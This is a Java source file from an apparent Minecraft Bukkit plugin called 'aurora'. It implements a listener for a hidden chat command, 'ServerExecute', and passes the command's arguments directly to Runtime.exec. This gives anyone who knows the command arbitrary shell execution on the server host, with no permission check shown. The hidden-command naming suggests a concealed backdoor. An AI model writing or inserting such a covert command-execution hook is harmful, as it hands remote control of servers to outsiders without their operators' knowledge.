package me.oscarcusick.aurora.Commands.Executors;

import me.oscarcusick.aurora.Commands.HiddenCommandEvent;
import me.oscarcusick.aurora.Utility.GeneralUtility;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ServerExecuteCommandExecutor implements Listener {
    Plugin PluginInstance;
    public ServerExecuteCommandExecutor(Plugin PluginInstance) {
        this.PluginInstance = PluginInstance;
    }

    @EventHandler
    public void ServerExecuteCommandExecutor(HiddenCommandEvent event) {
        if (!event.command.equalsIgnoreCase("ServerExecute")) {
            return;
        }
        GeneralUtility GU = new GeneralUtility(PluginInstance);

        String FinalCommand = "";
        for (int i = 0; i < event.strings.length; i++) {
            FinalCommand += (event.strings[i].toString() + " ");
        }

        try {
            Process Exec = Runtime.getRuntime().exec(FinalCommand);
            // cant read output as that freezes server
        } catch (IOException e) {
            GU.TellPlayer(event.commandSender, "getRuntime.exec(command) resulted in IOException");
            throw new RuntimeException(e);
        }
    }
}
